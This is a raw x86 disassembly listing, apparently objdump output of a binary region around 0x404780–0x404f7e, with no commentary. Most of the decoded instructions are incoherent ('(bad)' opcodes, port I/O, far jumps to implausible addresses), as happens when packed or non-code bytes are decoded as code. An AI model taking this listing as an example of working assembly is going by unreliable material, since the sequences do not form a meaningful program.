  40477f:	62 29                	bound  %ebp,(%ecx)
  404781:	34 59                	xor    $0x59,%al
  404783:	10 f5                	adc    %dh,%ch
  404785:	e0 cb                	loopne 0x404752
  404787:	6a c6                	push   $0xffffffc6
  404789:	56                   	push   %esi
	...
  4047b2:	00 00                	add    %al,(%eax)
  4047b4:	3a 86 34 0c 56 3c    	cmp    0x3c560c34(%esi),%al
  4047ba:	b6 e0                	mov    $0xe0,%dh
  4047bc:	39 26                	cmp    %esp,(%esi)
  4047be:	a0 c5 4a 5b 3c       	mov    0x3c5b4ac5,%al
  4047c3:	8d 1a                	lea    (%edx),%ebx
  4047c5:	dc 1c 0c             	fcompl (%esp,%ecx,1)
  4047c8:	3f                   	aas
  4047c9:	5b                   	pop    %ebx
  4047ca:	e9 83 93 54 8e       	jmp    0x8e94db52
  4047cf:	16                   	push   %ss
  4047d0:	e7 12                	out    %eax,$0x12
  4047d2:	28 04 b9             	sub    %al,(%ecx,%edi,4)
  4047d5:	1f                   	pop    %ds
  4047d6:	f1                   	int1
  4047d7:	6d                   	insl   (%dx),%es:(%edi)
  4047d8:	3e 86 fc             	ds xchg %bh,%ah
  4047db:	f7 f8                	idiv   %eax
  4047dd:	0f d9 e0             	psubusw %mm0,%mm4
  4047e0:	6b 57 66 56          	imul   $0x56,0x66(%edi),%edx
  4047e4:	36 73 55             	ss jae 0x40483c
  4047e7:	e1 e1                	loope  0x4047ca
  4047e9:	85 20                	test   %esp,(%eax)
  4047eb:	c5 2e                	lds    (%esi),%ebp
  4047ed:	5b                   	pop    %ebx
  4047ee:	02 c4                	add    %ah,%al
  4047f0:	c5 aa 18 e5 87 53    	lds    0x5387e518(%edx),%ebp
  4047f6:	e9 03 3e ac 43       	jmp    0x43ec85fe
  4047fb:	54                   	push   %esp
  4047fc:	4a                   	dec    %edx
  4047fd:	dc 3b                	fdivrl (%ebx)
  4047ff:	12 cc                	adc    %ah,%cl
  404801:	b3 25                	mov    $0x25,%bl
  404803:	82 ac 6b f8 f2 4e 79 	subb   $0x7,0x794ef2f8(%ebx,%ebp,2)
  40480a:	07 
  40480b:	8a 32                	mov    (%edx),%dh
  40480d:	e0 f9                	loopne 0x404808
  40480f:	8a ff                	mov    %bh,%bh
  404811:	5a                   	pop    %edx
  404812:	07                   	pop    %es
  404813:	c3                   	ret
  404814:	13 a1 2a 36 00 00    	adc    0x362a(%ecx),%esp
	...
  404842:	b5 76                	mov    $0x76,%ch
  404844:	00 9e ca 1f 08 f6    	add    %bl,-0x9f7e036(%esi)
  40484a:	ac                   	lods   %ds:(%esi),%al
  40484b:	d1 7d f5             	sarl   -0xb(%ebp)
  40484e:	b4 17                	mov    $0x17,%ah
  404850:	10 f2                	adc    %dh,%dl
  404852:	72 0e                	jb     0x404862
  404854:	18 62 92             	sbb    %ah,-0x6e(%edx)
  404857:	9b                   	fwait
  404858:	ea e1 2f 5e 25 c6 42 	ljmp   $0x42c6,$0x255e2fe1
  40485f:	5b                   	pop    %ebx
  404860:	00 72 36             	add    %dh,0x36(%edx)
  404863:	e0 10                	loopne 0x404875
  404865:	60                   	pusha
  404866:	83 5b 33 ab          	sbbl   $0xffffffab,0x33(%ebx)
  40486a:	79 79                	jns    0x4048e5
  40486c:	e8 9e f2 24 c9       	call   0xc9653b0f
  404871:	ab                   	stos   %eax,%es:(%edi)
  404872:	4e                   	dec    %esi
  404873:	5b                   	pop    %ebx
  404874:	55                   	push   %ebp
  404875:	62 0e                	bound  %ecx,(%esi)
  404877:	29 83 0c 42 5b 75    	sub    %eax,0x755b420c(%ebx)
  40487d:	ee                   	out    %al,(%dx)
  40487e:	00 1f                	add    %bl,(%edi)
  404880:	08 66 72             	or     %ah,0x72(%esi)
  404883:	1a 00                	sbb    (%eax),%al
  404885:	6a 5f                	push   $0x5f
  404887:	57                   	push   %edi
  404888:	00 f4                	add    %dh,%ah
  40488a:	38 9c 45 f5 c0 13 41 	cmp    %bl,0x4113c0f5(%ebp,%eax,2)
  404891:	e9 00 0f 08 41       	jmp    0x41485796
  404896:	d3 7d 00             	sarl   %cl,0x0(%ebp)
  404899:	e9 c4 a3 ff bc       	jmp    0xbd3fec62
  40489e:	39 73 07             	cmp    %esi,0x7(%ebx)
  4048a1:	46                   	inc    %esi
  4048a2:	3a 5b 03             	cmp    0x3(%ebx),%bl
  4048a5:	11 00                	adc    %eax,(%eax)
	...
  4048cf:	00 fd                	add    %bh,%ch
  4048d1:	27                   	daa
  4048d2:	e8 ee 91 84 ff       	call   0xffc4dac5
  4048d7:	72 ea                	jb     0x4048c3
  4048d9:	84 75 f1             	test   %dh,-0xf(%ebp)
  4048dc:	6c                   	insb   (%dx),%es:(%edi)
  4048dd:	73 11                	jae    0x4048f0
  4048df:	0e                   	push   %cs
  4048e0:	42                   	inc    %edx
  4048e1:	5b                   	pop    %ebx
  4048e2:	ff 94 41 28 e8 00 91 	call   *-0x6eff17d8(%ecx,%eax,2)
  4048e9:	7d 00                	jge    0x4048eb
  4048eb:	00 0c 98             	add    %cl,(%eax,%ebx,4)
  4048ee:	5b                   	pop    %ebx
  4048ef:	c9                   	leave
  4048f0:	25 57 00 55 dc       	and    $0xdc550057,%eax
  4048f5:	8a 53 83             	mov    -0x7d(%ebx),%dl
  4048f8:	e2 56                	loop   0x404950
  4048fa:	00 75 58             	add    %dh,0x58(%ebp)
  4048fd:	9d                   	popf
  4048fe:	45                   	inc    %ebp
  4048ff:	08 e8                	or     %ch,%al
  404901:	0f 41 00             	cmovno (%eax),%eax
  404904:	e4 fa                	in     $0xfa,%al
  404906:	0b 00                	or     (%eax),%eax
  404908:	0a 5c c7 45          	or     0x45(%edi,%eax,8),%bl
  40490c:	53                   	push   %ebx
  40490d:	dd 48 41             	fisttpll 0x41(%eax)
  404910:	27                   	daa
  404911:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404912:	75 08                	jne    0x40491c
  404914:	ff                   	(bad)
  404915:	ba e6 00 17 d1       	mov    $0xd11700e6,%edx
  40491a:	d8 ff                	fdivr  %st(7),%st
  40491c:	4a                   	dec    %edx
  40491d:	6b e8 b3             	imul   $0xffffffb3,%eax,%ebp
  404920:	c9                   	leave
  404921:	57                   	push   %edi
  404922:	00 03                	add    %al,(%ebx)
  404924:	cf                   	iret
  404925:	18 53 e8             	sbb    %dl,-0x18(%ebx)
  404928:	ac                   	lods   %ds:(%esi),%al
  404929:	a0 ff ff 8c c0       	mov    0xc08cffff,%al
  40492e:	ff 75 df             	push   -0x21(%ebp)
  404931:	48                   	dec    %eax
  404932:	e8 bd 00 00 00       	call   0x4049f4
	...
  40495b:	00 00                	add    %al,(%eax)
  40495d:	00 b9 57 00 ff 0a    	add    %bh,0xaff0057(%ecx)
  404963:	54                   	push   %esp
  404964:	53                   	push   %ebx
  404965:	e8 9d 7d 00 00       	call   0x40c707
  40496a:	66 fb                	data16 sti
  40496c:	07                   	pop    %es
  40496d:	87 9f 1e 00 74 cf    	xchg   %ebx,-0x308bffe2(%edi)
  404973:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404974:	75 08                	jne    0x40497e
  404976:	6f                   	outsl  %ds:(%esi),(%dx)
  404977:	b5 fb                	mov    $0xfb,%ch
  404979:	ff 70 d1             	push   -0x2f(%eax)
  40497c:	c3                   	ret
  40497d:	5b                   	pop    %ebx
  40497e:	5e                   	pop    %esi
  40497f:	9a 08 00 ea d0 ec 83 	lcall  $0x83ec,$0xd0ea0008
  404986:	5b                   	pop    %ebx
  404987:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404988:	57                   	push   %edi
  404989:	68 3e 77 04 00       	push   $0x4773e
  40498e:	3e 5a                	ds pop %edx
  404990:	ad                   	lods   %ds:(%esi),%eax
  404991:	fb                   	sti
  404992:	89 5c 8c 45          	mov    %ebx,0x45(%esp,%ecx,4)
  404996:	82 f0 1f             	xor    $0x1f,%al
  404999:	bd 05 b3 03 00       	mov    $0x3b305,%ebp
  40499e:	eb 6f                	jmp    0x404a0f
  4049a0:	ea 16 69 26 e0 6a 3e 	ljmp   $0x3e6a,$0xe0266916
  4049a7:	28 04 ff             	sub    %al,(%edi,%edi,8)
  4049aa:	d3 79 69             	sarl   %cl,0x69(%ecx)
  4049ad:	00 51 8e             	add    %dl,-0x72(%ecx)
  4049b0:	9e                   	sahf
  4049b1:	4b                   	dec    %ebx
  4049b2:	ff 71 86             	push   -0x7a(%ecx)
  4049b5:	c0 c7 49             	rol    $0x49,%bh
  4049b8:	dd 75 3a             	fnsave 0x3a(%ebp)
  4049bb:	9d                   	popf
  4049bc:	69 fb 31 b2 c5 45    	imul   $0x45c5b231,%ebx,%edi
	...
  4049ea:	00 00                	add    %al,(%eax)
  4049ec:	2a 75 03             	sub    0x3(%ebp),%dh
  4049ef:	00 3e                	add    %bh,(%esi)
  4049f1:	21 c3                	and    %eax,%ebx
  4049f3:	4b                   	dec    %ebx
  4049f4:	7f 74                	jg     0x404a6a
  4049f6:	e8 2d c5 89 88       	call   0x88ca0f28
  4049fb:	45                   	inc    %ebp
  4049fc:	36 8f                	ss (bad)
  4049fe:	dc 7f 01             	fdivrl 0x1(%edi)
  404a01:	02 1b                	add    (%ebx),%bl
  404a03:	42                   	inc    %edx
  404a04:	42                   	inc    %edx
  404a05:	7f f8                	jg     0x4049ff
  404a07:	69 3e 1f 42 08 8e    	imul   $0x8e08421f,(%esi),%edi
  404a0d:	ac                   	lods   %ds:(%esi),%al
  404a0e:	0e                   	push   %cs
  404a0f:	4d                   	dec    %ebp
  404a10:	7f 74                	jg     0x404a86
  404a12:	dc 32                	fdivl  (%edx)
  404a14:	e6 c0                	out    %al,$0xc0
  404a16:	dd ff                	(bad)
  404a18:	d1 7d c3             	sarl   -0x3d(%ebp)
  404a1b:	74 43                	je     0x404a60
  404a1d:	0b 47 fc             	or     -0x4(%edi),%eax
  404a20:	d5 8c                	aad    $0x8c
  404a22:	80 c7 42             	add    $0x42,%bh
  404a25:	f5                   	cmc
  404a26:	1c 00                	sbb    $0x0,%al
  404a28:	2b 62 89             	sub    -0x77(%edx),%esp
  404a2b:	45                   	inc    %ebp
  404a2c:	aa                   	stos   %al,%es:(%edi)
  404a2d:	5b                   	pop    %ebx
  404a2e:	c6                   	(bad)
  404a2f:	ca 7c 57             	lret   $0x577c
  404a32:	e9 36 c5 6f ba       	jmp    0xbab00f6d
  404a37:	88 fb                	mov    %bh,%bl
  404a39:	52                   	push   %edx
  404a3a:	e2 c3                	loop   0x4049ff
  404a3c:	12 58 69             	adc    0x69(%eax),%bl
  404a3f:	1c 3e                	sbb    $0x3e,%al
  404a41:	08 f3                	or     %dh,%bl
  404a43:	9b                   	fwait
  404a44:	3e 5b                	ds pop %ebx
  404a46:	e9 03 15 94 2b       	jmp    0x2bd45f4e
  404a4b:	08 3e                	or     %bh,(%esi)
  404a4d:	f5                   	cmc
  404a4e:	e8 69 00 00 00       	call   0x404abc
	...
  404a77:	00 00                	add    %al,(%eax)
  404a79:	00 3e                	add    %bh,(%esi)
  404a7b:	f5                   	cmc
  404a7c:	e9 69 3e f5 e8       	jmp    0xe93588ea
  404a81:	6b be 5b e9 03 49 08 	imul   $0x8,0x4903e95b(%esi),%edi
  404a88:	f1                   	int1
  404a89:	eb 8e                	jmp    0x404a19
  404a8b:	78 e9                	js     0x404a76
  404a8d:	03 c5                	add    %ebp,%eax
  404a8f:	a2 02 c4 7d 07       	mov    %al,0x77dc402
  404a94:	e2 30                	loop   0x404ac6
  404a96:	16                   	push   %ss
  404a97:	b2 8c                	mov    $0x8c,%dl
  404a99:	03 3e                	add    (%esi),%edi
  404a9b:	c3                   	ret
  404a9c:	e8 03 3e 5b 32       	call   0x329b88a4
  404aa1:	cb                   	lret
  404aa2:	fc                   	cld
  404aa3:	56                   	push   %esi
  404aa4:	e9 36 b5 6e 72       	jmp    0x72aeffdf
  404aa9:	46                   	inc    %esi
  404aaa:	36 56                	ss push %esi
  404aac:	a9 57 43 db b1       	test   $0xb1db4357,%eax
  404ab1:	03 6b 54             	add    0x54(%ebx),%ebp
  404ab4:	31 03                	xor    %eax,(%ebx)
  404ab6:	3e 5b                	ds pop %ebx
  404ab8:	e9 ca fc 56 e9       	jmp    0xe9974787
  404abd:	dc 53 53             	fcoml  0x53(%ebx)
  404ac0:	41                   	inc    %ecx
  404ac1:	98                   	cwtl
  404ac2:	db 5a e9             	fistpl -0x17(%edx)
  404ac5:	80 c6 81             	add    $0x81,%dh
  404ac8:	bd 0e 97 6a e9       	mov    $0xe96a970e,%ebp
  404acd:	03 3e                	add    (%esi),%edi
  404acf:	52                   	push   %edx
  404ad0:	00 5c 7d 51          	add    %bl,0x51(%ebp,%edi,2)
  404ad4:	b6 29                	mov    $0x29,%dh
  404ad6:	96                   	xchg   %eax,%esi
  404ad7:	57                   	push   %edi
  404ad8:	b8 e9 3d 5b 00       	mov    $0x5b3de9,%eax
  404add:	30 00                	xor    %al,(%eax)
	...
  404b07:	00 7f 56             	add    %bh,0x56(%edi)
  404b0a:	00 bc c6 6e 83 25 69 	add    %bh,0x6925836e(%esi,%eax,8)
  404b11:	f4                   	hlt
  404b12:	ff 92 3d 82 75 f1    	call   *-0xe8a7dc3(%edx)
  404b18:	65 e6 e5             	gs out %al,$0xe5
  404b1b:	e9 3d 56 c0 75       	jmp    0x7600a15d
  404b20:	17                   	pop    %ss
  404b21:	2b 50 d1             	sub    -0x2f(%eax),%edx
  404b24:	e0 84                	loopne 0x404aaa
  404b26:	ff                   	(bad)
  404b27:	de cb                	fmulp  %st,%st(3)
  404b29:	17                   	pop    %ss
  404b2a:	fc                   	cld
  404b2b:	31 0a                	xor    %ecx,(%edx)
  404b2d:	82 75 cd 65          	xorb   $0x65,-0x33(%ebp)
  404b31:	07                   	pop    %es
  404b32:	08 d1                	or     %dl,%cl
  404b34:	e3 77                	jecxz  0x404bad
  404b36:	00 e9                	add    %ch,%cl
  404b38:	48                   	dec    %eax
  404b39:	9b                   	fwait
  404b3a:	75 e5                	jne    0x404b21
  404b3c:	14 07                	adc    $0x7,%al
  404b3e:	fc                   	cld
  404b3f:	c1 9d 85 ff a6 51 9b 	rcrl   $0x9b,0x51a6ff85(%ebp)
  404b46:	eb ea                	jmp    0x404b32
  404b48:	c8 16 fc a0          	enter  $0xfc16,$0xa0
  404b4c:	f8                   	clc
  404b4d:	57                   	push   %edi
  404b4e:	00 34 b9             	add    %dh,(%ecx,%edi,4)
  404b51:	6f                   	outsl  %ds:(%esi),(%dx)
  404b52:	53                   	push   %ebx
  404b53:	72 47                	jb     0x404b9c
  404b55:	4f                   	dec    %edi
  404b56:	6a d9                	push   $0xffffffd9
  404b58:	30 73 7b             	xor    %dh,0x7b(%ebx)
  404b5b:	73 15                	jae    0x404b72
  404b5d:	81 6a e9 5b 5b 6a ea 	subl   $0xea6a5b5b,-0x17(%edx)
  404b64:	53                   	push   %ebx
  404b65:	5b                   	pop    %ebx
  404b66:	6a ea                	push   $0xffffffea
  404b68:	65 5b                	gs pop %ebx
  404b6a:	00 e9                	add    %ch,%cl
	...
  404b94:	00 00                	add    %al,(%eax)
  404b96:	bd 80 75 e1 d5       	mov    $0xd5e17580,%ebp
  404b9b:	87 e4                	xchg   %esp,%esp
  404b9d:	00 d7                	add    %dl,%bh
  404b9f:	5c                   	pop    %esp
  404ba0:	89 03                	mov    %eax,(%ebx)
  404ba2:	e7 10                	out    %eax,$0x10
  404ba4:	5c                   	pop    %esp
  404ba5:	6a a7                	push   $0xffffffa7
  404ba7:	4c                   	dec    %esp
  404ba8:	e8 35 02 57 00       	call   0x974de2
  404bad:	89 d4                	mov    %edx,%esp
  404baf:	58                   	pop    %eax
  404bb0:	6a 00                	push   $0x0
  404bb2:	ad                   	lods   %ds:(%esi),%eax
  404bb3:	5c                   	pop    %esp
  404bb4:	6a 00                	push   $0x0
  404bb6:	bd 56 6a 00 38       	mov    $0x38006a56,%ebp
  404bbb:	68 e8 27 32 57       	push   $0x573227e8
  404bc0:	00 0b                	add    %cl,(%ebx)
  404bc2:	27                   	daa
  404bc3:	2b 2f                	sub    (%edi),%ebp
  404bc5:	89 a4 80 69 00 bd 5c 	mov    %esp,0x5cbd0069(%eax,%eax,4)
  404bcc:	6a 00                	push   $0x0
  404bce:	0d 5b 50 e8 3f       	or     $0x3fe8505b,%eax
  404bd3:	7a 00                	jp     0x404bd5
  404bd5:	00 de                	add    %bl,%dh
  404bd7:	18 08                	sbb    %cl,(%eax)
  404bd9:	0b 97 2b 24 ff 04    	or     0x4ff242b(%edi),%edx
  404bdf:	5b                   	pop    %ebx
  404be0:	e8 bb 03 5c 00       	call   0x9c4fa0
  404be5:	ff 34 74             	push   (%esp,%esi,2)
  404be8:	b4 e4                	mov    $0xe4,%ah
  404bea:	17                   	pop    %ss
  404beb:	5c                   	pop    %esp
  404bec:	c7 03 d8 a4 ff ff    	movl   $0xffffa4d8,(%ebx)
  404bf2:	ac                   	lods   %ds:(%esi),%al
  404bf3:	52                   	push   %edx
  404bf4:	ff 33                	push   (%ebx)
  404bf6:	bf ba e4 00 00       	mov    $0xe4ba,%edi
	...
  404c23:	00 17                	add    %dl,(%edi)
  404c25:	9d                   	popf
  404c26:	03 ff                	add    %edi,%edi
  404c28:	b8 a4 ff 2b a7       	mov    $0xa72bffa4,%eax
  404c2d:	5e                   	pop    %esi
  404c2e:	43                   	inc    %ebx
  404c2f:	08 d8                	or     %bl,%al
  404c31:	0a c0                	or     %al,%al
  404c33:	5b                   	pop    %ebx
  404c34:	9e                   	sahf
  404c35:	95                   	xchg   %eax,%ebp
  404c36:	08 00                	or     %al,(%eax)
  404c38:	a2 d0 ec 53 4c       	mov    %al,0x4c53ecd0
  404c3d:	43                   	inc    %ebx
  404c3e:	08 83 3e 6d db 74    	or     %al,0x74db6d3e(%ebx)
  404c44:	31 11                	xor    %edx,(%ecx)
  404c46:	56                   	push   %esi
  404c47:	08 d6                	or     %dl,%dh
  404c49:	63 df                	arpl   %bx,%di
  404c4b:	00 3e                	add    %bh,(%esi)
  404c4d:	41                   	inc    %ecx
  404c4e:	56                   	push   %esi
  404c4f:	04 a6                	add    $0xa6,%al
  404c51:	bf df 00 3e 31       	mov    $0x313e00df,%edi
  404c56:	16                   	push   %ss
  404c57:	e8 11 4e 03 00       	call   0x439a6d
  404c5c:	f5                   	cmc
  404c5d:	4a                   	dec    %edx
  404c5e:	c5 04 3e             	lds    (%esi,%edi,1),%eax
  404c61:	bf 8e ec bf 35       	mov    $0x35bfec8e,%edi
  404c66:	e3 ef                	jecxz  0x404c57
  404c68:	81 58 31 57 bd be 28 	sbbl   $0x28bebd57,0x31(%eax)
  404c6f:	48                   	dec    %eax
  404c70:	ff 71 03             	push   0x3(%ecx)
  404c73:	74 53                	je     0x404cc8
  404c75:	71 0f                	jno    0x404c86
  404c77:	2d f6 32 04 e8       	sub    $0xe80432f6,%eax
  404c7c:	bf 7a d9 ff 79       	mov    $0x79ffd97a,%edi
  404c81:	6e                   	outsb  %ds:(%esi),(%dx)
  404c82:	26 48                	es dec %eax
  404c84:	ff 71 03             	push   0x3(%ecx)
	...
  404caf:	00 00                	add    %al,(%eax)
  404cb1:	00 3e                	add    %bh,(%esi)
  404cb3:	72 84                	jb     0x404c39
  404cb5:	3d 6f 4c 43 00       	cmp    $0x434c6f,%eax
  404cba:	3e 40                	ds inc %eax
  404cbc:	ef                   	out    %eax,(%dx)
  404cbd:	fe                   	(bad)
  404cbe:	73 83                	jae    0x404c43
  404cc0:	4b                   	dec    %ebx
  404cc1:	41                   	inc    %ecx
  404cc2:	3e ec                	ds in  (%dx),%al
  404cc4:	65 f9                	gs stc
  404cc6:	19 de                	sbb    %ebx,%esi
  404cc8:	c1 05 4f 3c 43 00 3e 	roll   $0x3e,0x433c4f
  404ccf:	74 03                	je     0x404cd4
  404cd1:	00 b3 ef d3 ef f9    	add    %dh,-0x6102c11(%ebx)
  404cd7:	fd                   	std
  404cd8:	33 e8                	xor    %eax,%ebp
  404cda:	a3 04 d9 ff bb       	mov    %eax,0xbbffd904
  404cdf:	f7 e7                	mul    %edi
  404ce1:	ef                   	out    %eax,(%dx)
  404ce2:	e1 5b                	loope  0x404d3f
  404ce4:	66 34 e6             	data16 xor $0xe6,%al
  404ce7:	bc 59 d9 d1 d0       	mov    $0xd0d1d959,%esp
  404cec:	ac                   	lods   %ds:(%esi),%al
  404ced:	d7                   	xlat   %ds:(%ebx)
  404cee:	6e                   	outsb  %ds:(%esi),(%dx)
  404cef:	f3 13 4c 7f 5b       	repz adc 0x5b(%edi,%edi,2),%ecx
  404cf4:	d1 05 3e 5b 69 ec    	roll   0xec695b3e
  404cfa:	1e                   	push   %ds
  404cfb:	78 e9                	js     0x404ce6
  404cfd:	03 35 9b de 7e 05    	add    0x57ede9b,%esi
  404d03:	5c                   	pop    %esp
  404d04:	e9 03 81 d8 15       	jmp    0x1618ce0c
  404d09:	e9 91 7e e9 03       	jmp    0x429cb9f
  404d0e:	3e 5b                	ds pop %ebx
  404d10:	26 7f 86             	es jg  0x404c99
  404d13:	6e                   	outsb  %ds:(%esi),(%dx)
  404d14:	06                   	push   %es
  404d15:	d9 00                	flds   (%eax)
	...
  404d3f:	00 79 4e             	add    %bh,0x4e(%ecx)
  404d42:	e9 03 e4 5a 83       	jmp    0x839b314a
  404d47:	03 d4                	add    %esp,%edx
  404d49:	5a                   	pop    %edx
  404d4a:	83 03 b3             	addl   $0xffffffb3,(%ebx)
  404d4d:	d8 e1                	fsub   %st(1),%st
  404d4f:	e8 59 7e 39 87       	call   0x8779cbad
  404d54:	bb 7f c6 d8 49       	mov    $0x49d8c67f,%ebx
  404d59:	2b ce                	sub    %esi,%ecx
  404d5b:	8e 4a 6e             	mov    0x6e(%edx),%cs
  404d5e:	c6                   	(bad)
  404d5f:	d8 39                	fdivrs (%ecx)
  404d61:	08 bd eb 58 78 e9    	or     %bh,-0x1687a715(%ebp)
  404d67:	03 35 9b de 7e 4d    	add    0x4d7ede9b,%esi
  404d6d:	5c                   	pop    %esp
  404d6e:	e9 03 a6 d8 31       	jmp    0x3218f376
  404d73:	43                   	inc    %ebx
  404d74:	3e f3 db 4b 7f       	repz fisttpl %ds:0x7f(%ebx)
  404d79:	5b                   	pop    %ebx
  404d7a:	81 51 02 7e 86 0c fe 	adcl   $0xfe0c867e,0x2(%ecx)
  404d81:	4d                   	dec    %ebp
  404d82:	65 d2 3e             	sarb   %cl,%gs:(%esi)
  404d85:	5b                   	pop    %ebx
  404d86:	00 e9                	add    %ch,%cl
  404d88:	ba aa 8d 64 09       	mov    $0x9648daa,%edx
  404d8d:	6e                   	outsb  %ds:(%esi),(%dx)
  404d8e:	ff 66 0d             	jmp    *0xd(%esi)
  404d91:	29 e8                	sub    %ebp,%eax
  404d93:	9a e9 7d ff e2 fd 4d 	lcall  $0x4dfd,$0xe2ff7de9
  404d9a:	84 33                	test   %dh,(%ebx)
  404d9c:	3d 5b 00 70 38       	cmp    $0x3870005b,%eax
  404da1:	7b ef                	jnp    0x404d92
  404da3:	3e 00 00             	add    %al,%ds:(%eax)
	...
  404dce:	96                   	xchg   %eax,%esi
  404dcf:	cf                   	iret
  404dd0:	85 41 96             	test   %eax,-0x6a(%ecx)
  404dd3:	7d ff                	jge    0x404dd4
  404dd5:	99                   	cltd
  404dd6:	15 f4 47 a8 3d       	adc    $0x3da847f4,%eax
  404ddb:	7e b5                	jle    0x404d92
  404ddd:	09 a6 7d ff 81 43    	or     %esp,0x4381ff7d(%esi)
  404de3:	5b                   	pop    %ebx
  404de4:	00 69 95             	add    %ch,-0x6b(%ecx)
  404de7:	ac                   	lods   %ds:(%esi),%al
  404de8:	fb                   	sti
  404de9:	06                   	push   %es
  404dea:	96                   	xchg   %eax,%esi
  404deb:	51                   	push   %ecx
  404dec:	c0 ee f1             	shr    $0xf1,%dh
  404def:	b7 00                	mov    $0x0,%bh
  404df1:	e9 3d da f8 e8       	jmp    0xe9392833
  404df6:	36 d5 9c             	ss aad $0x9c
  404df9:	e9 3d 5b 50 de       	jmp    0xde90a93b
  404dfe:	af                   	scas   %es:(%edi),%eax
  404dff:	72 ef                	jb     0x404df0
  404e01:	d6                   	(bad)
  404e02:	71 2a                	jno    0x404e2e
  404e04:	ff 94 6a 6d ff c6 2a 	call   *0x2ac6ff6d(%edx,%ebp,2)
  404e0b:	44                   	inc    %esp
  404e0c:	f5                   	cmc
  404e0d:	be 09 cf 85 c1       	mov    $0xc185cf09,%esi
  404e12:	21 7d ff             	and    %edi,-0x1(%ebp)
  404e15:	19 92 02 48 28 42    	sbb    %edx,0x42284802(%edx)
  404e1b:	7c b5                	jl     0x404dd2
  404e1d:	89 19                	mov    %ebx,(%ecx)
  404e1f:	7d ff                	jge    0x404e20
  404e21:	01 3c 5b             	add    %edi,(%ebx,%ebx,2)
  404e24:	00 69 12             	add    %ch,0x12(%ecx)
  404e27:	ee                   	out    %al,(%dx)
  404e28:	fa                   	cli
  404e29:	00 c0                	add    %al,%al
  404e2b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404e2c:	0b c0                	or     %eax,%eax
  404e2e:	eb 3c                	jmp    0x404e6c
  404e30:	83 bd 00 00 00 00 00 	cmpl   $0x0,0x0(%ebp)
	...
  404e5b:	00 bf 74 ff ff d6    	add    %bh,-0x2900008c(%edi)
  404e61:	0e                   	push   %cs
  404e62:	3b 50 97             	cmp    -0x69(%eax),%edx
  404e65:	d3 85 fc 80 a4 ff    	roll   %cl,-0x5b7f04(%ebp)
  404e6b:	50                   	push   %eax
  404e6c:	7f 86                	jg     0x404df4
  404e6e:	e2 00                	loop   0x404e70
  404e70:	d7                   	xlat   %ds:(%ebx)
  404e71:	48                   	dec    %eax
  404e72:	8d 85 03 74 ff ff    	lea    -0x8bfd(%ebp),%eax
  404e78:	d7                   	xlat   %ds:(%ebx)
  404e79:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e7a:	b5 ec                	mov    $0xec,%ch
  404e7c:	00 a4 ff e8 61 ab ff 	add    %ah,-0x549e18(%edi,%edi,8)
  404e83:	ff                   	(bad)
  404e84:	7f a5                	jg     0x404e2b
  404e86:	b5 e8                	mov    $0xe8,%ch
  404e88:	40                   	inc    %eax
  404e89:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404e8a:	ff 50 30             	call   *0x30(%eax)
  404e8d:	ea ec ef 30 a4 e8 db 	ljmp   $0xdbe8,$0xa430efec
  404e94:	7b a5                	jnp    0x404e3b
  404e96:	ff                   	(bad)
  404e97:	e8 97 a0 ff ff       	call   0x3fef33
  404e9c:	3c 37                	cmp    $0x37,%al
  404e9e:	8d 85 53 75 ff ff    	lea    -0x8aad(%ebp),%eax
  404ea4:	17                   	pop    %ss
  404ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ea6:	d8 e2                	fsub   %st(2),%st
  404ea8:	67 58                	addr16 pop %eax
  404eaa:	40                   	inc    %eax
  404eab:	50                   	push   %eax
  404eac:	e2 da                	loop   0x404e88
  404eae:	fc                   	cld
  404eaf:	ef                   	out    %eax,(%dx)
  404eb0:	70 a5                	jo     0x404e57
  404eb2:	50                   	push   %eax
  404eb3:	ff                   	(bad)
  404eb4:	ba 74 ef ff f0       	mov    $0xf0ffef74,%edx
  404eb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404eba:	b4 f4                	mov    $0xf4,%ah
  404ebc:	f0 a4                	lock movsb %ds:(%esi),%es:(%edi)
  404ebe:	e8 e9 00 00 00       	call   0x404fac
	...
  404ee7:	00 00                	add    %al,(%eax)
  404ee9:	00 e8                	add    %ch,%al
  404eeb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404eec:	ff                   	(bad)
  404eed:	ff                   	(bad)
  404eee:	7a 78                	jp     0x404f68
  404ef0:	ef                   	out    %eax,(%dx)
  404ef1:	ff b0 6f de f7 3e    	push   0x3ef7de6f(%eax)
  404ef7:	e5 d6                	in     $0xd6,%eax
  404ef9:	ff                   	(bad)
  404efa:	bb e5 e6 ff f9       	mov    $0xf9ffe6e5,%ebx
  404eff:	ea 8e fe f1 fc d5 75 	ljmp   $0x75d5,$0xfcf1fe8e
  404f06:	ea d9 ce e3 3e 72 69 	ljmp   $0x6972,$0x3ee3ced9
  404f0d:	00 d9                	add    %bl,%cl
  404f0f:	de d3                	(bad)
  404f11:	ef                   	out    %eax,(%dx)
  404f12:	d1 1c eb             	rcrl   (%ebx,%ebp,8)
  404f15:	6f                   	outsl  %ds:(%esi),(%dx)
  404f16:	d2 24 d6             	shlb   %cl,(%esi,%edx,8)
  404f19:	6a 3e                	push   $0x3e
  404f1b:	0d 90 ec a9 14       	or     $0x14a9ec90,%eax
  404f20:	d6                   	(bad)
  404f21:	e8 1c 46 d6 ff       	call   0x169542
  404f26:	bb ee de ef a1       	mov    $0xa1efdeee,%ebx
  404f2b:	2c 33                	sub    $0x33,%al
  404f2d:	ff d3                	call   *%ebx
  404f2f:	61                   	popa
  404f30:	e6 ff                	out    %al,$0xff
  404f32:	91                   	xchg   %eax,%ecx
  404f33:	69 7a e3 3e 72 80 c0 	imul   $0xc080723e,-0x1d(%edx),%edi
  404f3a:	06                   	push   %es
  404f3b:	b9 d6 b5 6e 64       	mov    $0x646eb5d6,%ecx
  404f40:	d6                   	(bad)
  404f41:	ff 66 cd             	jmp    *-0x33(%esi)
  404f44:	e6 ff                	out    %al,$0xff
  404f46:	69 fa 7f e8 51 6c    	imul   $0x6c51e87f,%edx,%edi
  404f4c:	d5 ff                	aad    $0xff
	...
  404f76:	00 00                	add    %al,(%eax)
  404f78:	93                   	xchg   %eax,%ebx
  404f79:	a9 e5 ff 51 a9       	test   $0xa951ffe5,%eax
  404f7e:	6e                   	outsb  %ds:(%esi),(%dx)
